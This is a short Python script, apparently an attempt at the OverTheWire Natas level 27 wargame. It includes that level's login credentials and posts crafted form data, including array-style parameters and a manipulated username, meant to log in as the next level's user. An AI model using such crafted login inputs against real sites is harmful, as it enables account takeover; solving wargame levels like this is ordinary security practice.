import requests

user_auth = ('natas27','55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

#target = 'http://natas27.natas.labs.overthewire.org/index.php'
target = 'http://localhost/postdataTest.php'

# create a user legitimately 
#payload = {'username[0]':'hi','password[0]':'hi',
#    'username[1]':'natas28','password[1]':'lol'}
payload = { 'password':'hi','username':'natas28 AND hi'}


response = requests.post(target, auth = user_auth, data = payload)
print response.text
